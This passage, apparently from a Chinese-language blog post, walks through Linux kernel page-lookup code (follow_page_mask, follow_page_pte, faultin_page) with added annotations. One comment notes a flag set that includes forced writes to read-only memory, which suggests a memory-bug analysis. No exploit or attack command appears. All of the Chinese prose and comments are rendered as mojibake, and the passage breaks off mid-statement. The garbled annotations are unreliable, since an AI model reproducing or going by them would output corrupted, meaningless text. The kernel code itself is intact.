class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * follow_page_mask - look up a page descriptor from a user-virtual address</span><br><span class="hljs-comment"> * @vma: vm_area_struct mapping @address</span><br><span class="hljs-comment"> * @address: virtual address to look up</span><br><span class="hljs-comment"> * @flags: flags modifying lookup behaviour</span><br><span class="hljs-comment"> * @page_mask: on output, *page_mask is set according to the size of the page</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * @flags can have FOLL_ flags set, defined in &lt;linux/mm.h&gt;</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Returns the mapped (struct page *), %NULL if no mapping exists, or</span><br><span class="hljs-comment"> * an error pointer if there is a mapping to something not represented</span><br><span class="hljs-comment"> * by a page descriptor (see also vm_normal_page()).</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">  follow_page_mask -æ ¹æ®ä¸€ä¸ªç”¨æˆ·ç©ºé—´åœ°å€æ‰¾ä¸€ä¸ªé¡µæè¿°ç¬¦</span><br><span class="hljs-comment">  @vmaï¼šæ˜ å°„@addressçš„VMAå¯¹è±¡</span><br><span class="hljs-comment">  @flagsï¼šæ§åˆ¶æŸ¥æ‰¾è¡Œä¸ºçš„æè¿°ç¬¦</span><br><span class="hljs-comment">  @page_maskï¼š*page_maskæ ¹æ®é¡µé¢å¤§å°è®¾ç½®</span><br><span class="hljs-comment">  </span><br><span class="hljs-comment">  è¿”å›è¢«æ˜ å°„çš„é¡µï¼Œå¦‚æœé¡µä¸å­˜åœ¨æˆ–è€…å‡ºé”™çš„è¯å°±è¿”å›NULL</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">struct</span> page *<span class="hljs-title function_">follow_page_mask</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vm_area_struct *vma,</span><br><span class="hljs-params">			      <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags,</span><br><span class="hljs-params">			      <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *page_mask)</span><br>&#123;<br>	<span class="hljs-type">pgd_t</span> *pgd;<span class="hljs-comment">//å…¨å±€é¡µç›®å½•</span><br>	<span class="hljs-type">pud_t</span> *pud;<span class="hljs-comment">//é¡µä¸Šçº§ç›®å½•</span><br>	<span class="hljs-type">pmd_t</span> *pmd;<span class="hljs-comment">//é¡µä¸­çº§ç›®å½•</span><br>	<span class="hljs-type">spinlock_t</span> *ptl;<span class="hljs-comment">//è‡ªæ—‹é”</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> vma-&gt;vm_mm;<span class="hljs-comment">//VMAæ‰€å±çš„å†…å­˜ç©ºé—´</span><br><br>	*page_mask = <span class="hljs-number">0</span>;<span class="hljs-comment">//æ ¹æ®é¡µé¢å¤§å°è®¾ç½®çš„æ©ç </span><br><br>	page = follow_huge_addr(mm, address, flags &amp; FOLL_WRITE);<br>	<span class="hljs-keyword">if</span> (!IS_ERR(page)) &#123;<br>		BUG_ON(flags &amp; FOLL_GET);<br>		<span class="hljs-keyword">return</span> page;<br>	&#125;<br>    <span class="hljs-comment">/*	</span><br><span class="hljs-comment">    	è·Ÿè¸ªå››çº§é¡µç›®å½•:pgd=&gt;pud=&gt;pmd,</span><br><span class="hljs-comment">    	å¦‚æœå¯¹åº”è¡¨é¡¹ä¸ºnone, åˆ™è¿”å›no_page_table()è¡¨ç¤ºå‡ºé”™, æœ€åè¿›å…¥follow_page_pte()è·Ÿè¸ªpte</span><br><span class="hljs-comment">    */</span><br>	<span class="hljs-comment">//åœ¨mmä¸­æ ¹æ®addressæ‰¾å¯¹åº”çš„é¡µå…¨å±€ç›®å½•</span><br>	pgd = pgd_offset(mm, address);<br>	<span class="hljs-keyword">if</span> (pgd_none(*pgd) || unlikely(pgd_bad(*pgd)))<br>		<span class="hljs-keyword">return</span> no_page_table(vma, flags);<br>    <br>	<span class="hljs-comment">//åœ¨é¡µå…¨å±€ç›®å½•ä¸­æ‰¾å¯¹åº”çš„é¡µä¸Šçº§ç›®å½•</span><br>	pud = pud_offset(pgd, address);<br>	<span class="hljs-keyword">if</span> (pud_none(*pud))<br>		<span class="hljs-keyword">return</span> no_page_table(vma, flags);<br>	<span class="hljs-keyword">if</span> (pud_huge(*pud) &amp;&amp; vma-&gt;vm_flags &amp; VM_HUGETLB) &#123;<br>		page = follow_huge_pud(mm, address, pud, flags);<br>		<span class="hljs-keyword">if</span> (page)<br>			<span class="hljs-keyword">return</span> page;<br>		<span class="hljs-keyword">return</span> no_page_table(vma, flags);<br>	&#125;<br>	<span class="hljs-keyword">if</span> (unlikely(pud_bad(*pud)))<br>		<span class="hljs-keyword">return</span> no_page_table(vma, flags);<br>	<span class="hljs-comment">//åœ¨é¡µä¸Šçº§ç›®å½•ä¸­æ‰¾å¯¹åº”çš„é¡µä¸­çº§ç›®å½•</span><br>	pmd = pmd_offset(pud, address);<br>	<span class="hljs-keyword">if</span> (pmd_none(*pmd))<br>		<span class="hljs-keyword">return</span> no_page_table(vma, flags);<br>	<span class="hljs-keyword">if</span> (pmd_huge(*pmd) &amp;&amp; vma-&gt;vm_flags &amp; VM_HUGETLB) &#123;<br>		page = follow_huge_pmd(mm, address, pmd, flags);<br>		<span class="hljs-keyword">if</span> (page)<br>			<span class="hljs-keyword">return</span> page;<br>		<span class="hljs-keyword">return</span> no_page_table(vma, flags);<br>	&#125;<br>	<span class="hljs-keyword">if</span> ((flags &amp; FOLL_NUMA) &amp;&amp; pmd_protnone(*pmd))<br>		<span class="hljs-keyword">return</span> no_page_table(vma, flags);<br>	<span class="hljs-keyword">if</span> (pmd_devmap(*pmd)) &#123;<br>		ptl = pmd_lock(mm, pmd);<br>		page = follow_devmap_pmd(vma, address, pmd, flags);<br>		spin_unlock(ptl);<br>		<span class="hljs-keyword">if</span> (page)<br>			<span class="hljs-keyword">return</span> page;<br>	&#125;<br>	<span class="hljs-keyword">if</span> (likely(!pmd_trans_huge(*pmd)))<span class="hljs-comment">//è·Ÿè¸ªpte</span><br>		<span class="hljs-keyword">return</span> follow_page_pte(vma, address, pmd, flags);<br><br>	ptl = pmd_lock(mm, pmd);<br>	<span class="hljs-keyword">if</span> (unlikely(!pmd_trans_huge(*pmd))) &#123;<br>		spin_unlock(ptl);<br>		<span class="hljs-keyword">return</span> follow_page_pte(vma, address, pmd, flags);<br>	&#125;<br>	<span class="hljs-keyword">if</span> (flags &amp; FOLL_SPLIT) &#123;<br>		<span class="hljs-type">int</span> ret;<br>		page = pmd_page(*pmd);<br>		<span class="hljs-keyword">if</span> (is_huge_zero_page(page)) &#123;<br>			spin_unlock(ptl);<br>			ret = <span class="hljs-number">0</span>;<br>			split_huge_pmd(vma, pmd, address);<br>			<span class="hljs-keyword">if</span> (pmd_trans_unstable(pmd))<br>				ret = -EBUSY;<br>		&#125; <span class="hljs-keyword">else</span> &#123;<br>			get_page(page);<br>			spin_unlock(ptl);<br>			lock_page(page);<br>			ret = split_huge_page(page);<br>			unlock_page(page);<br>			put_page(page);<br>			<span class="hljs-keyword">if</span> (pmd_none(*pmd))<br>				<span class="hljs-keyword">return</span> no_page_table(vma, flags);<br>		&#125;<br><br>		<span class="hljs-keyword">return</span> ret ? ERR_PTR(ret) :<br>			follow_page_pte(vma, address, pmd, flags);<br>	&#125;<br><br>	page = follow_trans_huge_pmd(vma, address, pmd, flags);<br>	spin_unlock(ptl);<br>	*page_mask = HPAGE_PMD_NR - <span class="hljs-number">1</span>;<br>	<span class="hljs-keyword">return</span> page;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="follow-page-pte"><a href="#follow-page-pte" class="headerlink" title="follow_page_pte()"></a>follow_page_pte()</h4><p>å¯¹äºå¤§å¤šæ•°æ™®é€šé¡µæ¥è¯´<code>follow_page_pte()</code>ä¼šæ£€æŸ¥é¡µä¸å­˜åœ¨å’Œé¡µä¸å¯å†™å…¥ä¸¤ç§ç¼ºé¡µå¼‚å¸¸, ç„¶åè°ƒç”¨<code>vm_normal_page()</code>æ ¹æ®<code>pte</code>æ‰¾åˆ°å¯¹åº”çš„é¡µæè¿°ç¬¦<code>page</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">//æ ¹æ®flagsæ ‡å¿—è·Ÿè¸ªé¡µé¢çš„pte</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> page *<span class="hljs-title function_">follow_page_pte</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vm_area_struct *vma,</span><br><span class="hljs-params">		<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address, <span class="hljs-type">pmd_t</span> *pmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> vma-&gt;vm_mm;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dev_pagemap</span> *<span class="hljs-title">pgmap</span> =</span> <span class="hljs-literal">NULL</span>;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br>	<span class="hljs-type">spinlock_t</span> *ptl;<br>	<span class="hljs-type">pte_t</span> *ptep, pte;<br><br>retry:<br>	<span class="hljs-keyword">if</span> (unlikely(pmd_bad(*pmd)))<br>		<span class="hljs-keyword">return</span> no_page_table(vma, flags);<br><br>	ptep = pte_offset_map_lock(mm, pmd, address, &amp;ptl);<br>	pte = *ptep;<br>	<span class="hljs-keyword">if</span> (!pte_present(pte)) &#123;<br>		<span class="hljs-type">swp_entry_t</span> entry;<br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * KSM&#x27;s break_ksm() relies upon recognizing a ksm page</span><br><span class="hljs-comment">		 * even while it is being migrated, so for that case we</span><br><span class="hljs-comment">		 * need migration_entry_wait().</span><br><span class="hljs-comment">		 */</span><br>		<span class="hljs-keyword">if</span> (likely(!(flags &amp; FOLL_MIGRATION)))<br>			<span class="hljs-keyword">goto</span> no_page;<br>		<span class="hljs-keyword">if</span> (pte_none(pte))<br>			<span class="hljs-keyword">goto</span> no_page;<br>		entry = pte_to_swp_entry(pte);<br>		<span class="hljs-keyword">if</span> (!is_migration_entry(entry))<br>			<span class="hljs-keyword">goto</span> no_page;<br>		pte_unmap_unlock(ptep, ptl);<br>		migration_entry_wait(mm, pmd, address);<br>		<span class="hljs-keyword">goto</span> retry;<br>	&#125;<br>	<span class="hljs-keyword">if</span> ((flags &amp; FOLL_NUMA) &amp;&amp; pte_protnone(pte))<br>		<span class="hljs-keyword">goto</span> no_page;<br>	<span class="hljs-keyword">if</span> ((flags &amp; FOLL_WRITE) &amp;&amp; !pte_write(pte)) &#123;<span class="hljs-comment">//å¦‚æœè¦æ±‚å†™å…¥ï¼Œä½†æ˜¯pteè¡¨ç¤ºä¸å¯å†™å…¥</span><br>		pte_unmap_unlock(ptep, ptl);<br>		<span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>	&#125;<br><br>	page = vm_normal_page(vma, address, pte);<span class="hljs-comment">//æ ¹æ®è¿™ä¸ªpteæ‰¾åˆ°å¯¹åº”çš„æ™®é€šé¡µæè¿°ç¬¦</span><br>    <span class="hljs-comment">/*	</span><br><span class="hljs-comment">    	æ‰¾åˆ°é¡µæè¿°ç¬¦å, ä¼šæ ¹æ®flagsè¿›è¡Œä¸€äº›æ“ä½œ, ç„¶åè¿”å›page, åœ¨è¿™é‡Œflags = 0x2017, ä¹Ÿå°±æ˜¯å¦‚ä¸‹æ ‡å¿—</span><br><span class="hljs-comment">		FOLL_WRITE 0x01 : éœ€è¦è¿›è¡Œå†™å…¥</span><br><span class="hljs-comment">		FOLL_TOUCH 0x02 : æ ‡è®°ä¸€ä¸‹é¡µé¢è¢«è®¿é—®è¿‡</span><br><span class="hljs-comment">		FOLL_GET 0x04 : è·å–é¡µé¢çš„å¼•ç”¨, ä»è€Œè®©é¡µé¢é”å®šåœ¨å†…å­˜ä¸­</span><br><span class="hljs-comment">		FOLL_FORCE 0x10 : å¼ºåˆ¶å†™å…¥åªè¯»å†…å­˜åŒº</span><br><span class="hljs-comment">		FOLL_REMOTE 0x2000 : è¦è®¿é—®çš„ä¸æ˜¯å½“å‰ä»»åŠ¡çš„å†…å­˜ç©ºé—´</span><br><span class="hljs-comment"> 	*/</span><br>	<span class="hljs-keyword">if</span> (!page &amp;&amp; pte_devmap(pte) &amp;&amp; (flags &amp; FOLL_GET)) &#123;<br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * Only return device mapping pages in the FOLL_GET case since</span><br><span class="hljs-comment">		 * they are only valid while holding the pgmap reference.</span><br><span class="hljs-comment">		 */</span><br>		pgmap = get_dev_pagemap(pte_pfn(pte), <span class="hljs-literal">NULL</span>);<br>		<span class="hljs-keyword">if</span> (pgmap)<br>			page = pte_page(pte);<br>		<span class="hljs-keyword">else</span><br>			<span class="hljs-keyword">goto</span> no_page;<br>	&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (unlikely(!page)) &#123;<br>		<span class="hljs-keyword">if</span> (flags &amp; FOLL_DUMP) &#123;<br>			<span class="hljs-comment">/* Avoid special (like zero) pages in core dumps */</span><br>			page = ERR_PTR(-EFAULT);<br>			<span class="hljs-keyword">goto</span> out;<br>		&#125;<br><br>		<span class="hljs-keyword">if</span> (is_zero_pfn(pte_pfn(pte))) &#123;<br>			page = pte_page(pte);<br>		&#125; <span class="hljs-keyword">else</span> &#123;<br>			<span class="hljs-type">int</span> ret;<br><br>			ret = follow_pfn_pte(vma, address, ptep, flags);<br>			page = ERR_PTR(ret);<br>			<span class="hljs-keyword">goto</span> out;<br>		&#125;<br>	&#125;<br><br>	<span class="hljs-keyword">if</span> (flags &amp; FOLL_SPLIT &amp;&amp; PageTransCompound(page)) &#123;<br>		<span class="hljs-type">int</span> ret;<br>		get_page(page);<br>		pte_unmap_unlock(ptep, ptl);<br>		lock_page(page);<br>		ret = split_huge_page(page);<br>		unlock_page(page);<br>		put_page(page);<br>		<span class="hljs-keyword">if</span> (ret)<br>			<span class="hljs-keyword">return</span> ERR_PTR(ret);<br>		<span class="hljs-keyword">goto</span> retry;<br>	&#125;<br><br>	<span class="hljs-keyword">if</span> (flags &amp; FOLL_GET) &#123;<span class="hljs-comment">//å¦‚æœè®¾ç½®äº†GETæ ‡å¿—ï¼Œåˆ™ä¼šè·å–ä¸€ä¸ªé¡µé¢çš„å¼•ç”¨ï¼Œé˜²æ­¢é¡µé¢ä»å†…å­˜ä¸­è¢«æ¢å‡º</span><br>		get_page(page);<br><br>		<span class="hljs-comment">/* drop the pgmap reference now that we hold the page */</span><br>		<span class="hljs-keyword">if</span> (pgmap) &#123;<br>			put_dev_pagemap(pgmap);<br>			pgmap = <span class="hljs-literal">NULL</span>;<br>		&#125;<br>	&#125;<br>	<span class="hljs-keyword">if</span> (flags &amp; FOLL_TOUCH) &#123;<span class="hljs-comment">//æ ‡è®°ä¸‹è¿™ä¸ªé¡µè¢«è®¿é—®è¿‡</span><br>        <span class="hljs-comment">//å¦‚æœè¦å†™å…¥ï¼Œä½†æ˜¯é¡µé¢ä¹Ÿåœ¨ä¸æ˜¯è„çš„è¯ï¼Œå°±è®¾ç½®ä¸ºè„é¡µ</span><br>		<span class="hljs-keyword">if</span> ((flags &amp; FOLL_WRITE) &amp;&amp;<br>		    !pte_dirty(pte) &amp;&amp; !PageDirty(page))<br>			set_page_dirty(page);<br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * pte_mkyoung() would be more correct here, but atomic care</span><br><span class="hljs-comment">		 * is needed to avoid losing the dirty bit: it is easier to use</span><br><span class="hljs-comment">		 * mark_page_accessed().</span><br><span class="hljs-comment">		 */</span><br>       <span class="hljs-comment">//æ ‡è®°</span><br>		mark_page_accessed(page);<br>	&#125;<br>	<span class="hljs-keyword">if</span> ((flags &amp; FOLL_MLOCK) &amp;&amp; (vma-&gt;vm_flags &amp; VM_LOCKED)) &#123;<br>		<span class="hljs-comment">/* Do not mlock pte-mapped THP */</span><br>		<span class="hljs-keyword">if</span> (PageTransCompound(page))<br>			<span class="hljs-keyword">goto</span> out;<br><br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * The preliminary mapping check is mainly to avoid the</span><br><span class="hljs-comment">		 * pointless overhead of lock_page on the ZERO_PAGE</span><br><span class="hljs-comment">		 * which might bounce very badly if there is contention.</span><br><span class="hljs-comment">		 *</span><br><span class="hljs-comment">		 * If the page is already locked, we don&#x27;t need to</span><br><span class="hljs-comment">		 * handle it now - vmscan will handle it later if and</span><br><span class="hljs-comment">		 * when it attempts to reclaim the page.</span><br><span class="hljs-comment">		 */</span><br>		<span class="hljs-keyword">if</span> (page-&gt;mapping &amp;&amp; trylock_page(page)) &#123;<br>			lru_add_drain();  <span class="hljs-comment">/* push cached pages to LRU */</span><br>			<span class="hljs-comment">/*</span><br><span class="hljs-comment">			 * Because we lock page here, and migration is</span><br><span class="hljs-comment">			 * blocked by the pte&#x27;s page reference, and we</span><br><span class="hljs-comment">			 * know the page is still mapped, we don&#x27;t even</span><br><span class="hljs-comment">			 * need to check for file-cache page truncation.</span><br><span class="hljs-comment">			 */</span><br>			mlock_vma_page(page);<br>			unlock_page(page);<br>		&#125;<br>	&#125;<br>out:<br>	pte_unmap_unlock(ptep, ptl);<br>	<span class="hljs-keyword">return</span> page;<br>no_page:<br>	pte_unmap_unlock(ptep, ptl);<br>	<span class="hljs-keyword">if</span> (!pte_none(pte))<br>		<span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>	<span class="hljs-keyword">return</span> no_page_table(vma, flags);<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="faultin-page"><a href="#faultin-page" class="headerlink" title="faultin_page()"></a>faultin_page()</h4><p><code>faultin_page()</code>ä¼šæŠŠ<code>flags</code>ä¸­çš„<code>FOLL</code>_æ ‡å¿—è½¬ä¸º<code>handle_mm_fault()</code>ä½¿ç”¨çš„<code>FAULT_</code>æ ‡å¿—, ç„¶åè°ƒç”¨<code>handle_mm_fault()</code>å¤„ç†</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * mmap_sem must be held on entry.  If @nonblocking != NULL and</span><br><span class="hljs-comment"> * *@flags does not include FOLL_NOWAIT, the mmap_sem may be released.</span><br><span class="hljs-comment"> * If it is, *@nonblocking will be set to 0 and -EBUSY returned.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">faultin_page</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> task_struct *tsk, <span class="hljs-keyword">struct</span> vm_area_struct *vma,</span><br><span class="hljs-params">		<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *flags, <span class="hljs-type">int</span> *nonblocking)</span><br>&#123;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> fault_flags = <span class="hljs-number">0</span>;<br>	<span class="hljs-type">int</span> ret;<br><br>	<span class="hljs-comment">/* mlock all present pages, but do not fault in new pages */</span><br>	<span class="hljs-keyword">if</span> ((*flags &amp; (FOLL_POPULATE | FOLL_MLOCK)) == FOLL_MLOCK)<br>		<span class="hljs-keyword">return</span> -ENOENT;<br>	<span class="hljs-comment">/* For mm_populate(), just skip the stack guard page. */</span><br>	<span class="hljs-keyword">if</span> ((*flags &amp; FOLL_POPULATE) &amp;&amp;<br>			(stack_guard_page_start(vma, address) ||<br>			 stack_guard_page_end(vma, address + PAGE_SIZE)))<br>		<span class="hljs-keyword">return</span> -ENOENT;<br>    <br>    <span class="hljs-comment">//æ ¹æ®FOLL_æ ‡ç€è®¾ç½®FAULT_FLAGæ ‡å¿—</span><br>	<span class="hljs-keyword">if</span> (*flags &amp; FOLL_WRITE)<br>		fault_flags |= FAULT_FLAG_WRITE;<br>	<span class="hljs-keyword">if</span> (*flags &amp; FOLL_REMOTE)<br>		fault_flags |= FAULT_FLAG_REMOTE;<br>	<span class="hljs-keyword">if</span> (nonblocking)<br>		fault_flags |= FAULT_FLAG_ALLOW_RETRY;<br>	<span class="hljs-keyword">if</span> (*flags &amp; FOLL_NOWAIT)<br>		fault_flags |= FAULT_FLAG_ALLOW_RETRY | FAULT_FLAG_RETRY_NOWAIT;<br>	<span class="hljs-keyword">if</span> (*flags &amp; FOLL_TRIED) &#123;<br>		VM_WARN_ON_ONCE(fault_flags &amp; FAULT_FLAG_ALLOW_RETRY);<br>		fault_flags |= FAULT_FLAG_TRIED;<br>	&#125;<br>	<span class="hljs-comment">//å¤„ç†ç¼ºé¡µå¼‚å¸¸</span><br>	ret = handle_mm_fault(vma, address, fault_flags);<br>	<span class="hljs-keyword">if</span> (ret &amp; VM_FAULT_ERROR) &#123;<br>		<span class="hljs-keyword">if</span> (ret &amp; VM_FAULT_OOM)<br>			<span class="hljs-keyword">return</span> -ENOMEM;<br>		<span class="hljs-keyword">if</span> (ret &amp; (VM_FAULT_HWPOISON | VM_FAULT_HWPOISON_LARGE))<br>			<span class="hljs-keyword">return</span> *flags &amp; FOLL_HWPOISON ? -EHWPOISON : -EFAULT;<br>		<span class="hljs-keyword">if</span> (ret &amp; (VM_FAULT_SIGBUS | VM_FAULT_SIGSEGV))<br>			<span class="hljs-keyword">return</span> -EFAULT;<br>		BUG();<br>	&#125;<br><br>	<span class="hljs-keyword">if</span> (tsk) &#123;<br>		<span class="hljs-keyword">if</span> (ret &amp; VM_FAULT_MAJOR)<br>			tsk-&gt;maj_flt++;<br>		<span class="hljs-keyword">else</span><br>			tsk-&gt;min_flt++;<br>	&#125;<br><br>	<span class="hljs-keyword">if</span> (ret &amp; VM_FAULT_RETRY) &#123;<br>		<span class="hljs-keyword">if</span> (nonblocking)<br>			*nonblocking = <span class="hljs-number">0</span>;<br>		<span class="hljs-keyword">return</span> -EBUSY;<br>	&#125;<br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * The VM_FAULT_WRITE bit tells us that do_wp_page has broken COW when</span><br><span class="hljs-comment">	 * necessary, even if maybe_mkwrite decided not to set pte_write. We</span><br><span class="hljs-comment">	 * can thus safely do subsequent page lookups as if they were reads.</span><br><span class="hljs-comment">	 * But only do so when looping for pte_write is futile: in some cases</span><br><span class="hljs-comment">	 * userspace may also be wanting to write to the gotten user page,</span><br><span class="hljs-comment">	 * which a read fault here might prevent (a readonly page might get</span><br><span class="hljs-comment">	 * reCOWed by userspace write).</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-keyword">if</span> ((ret &amp; VM_FAULT_WRITE) &amp;&amp; !(vma-&gt;vm_flags &amp; VM_WRITE))<br>		*flags 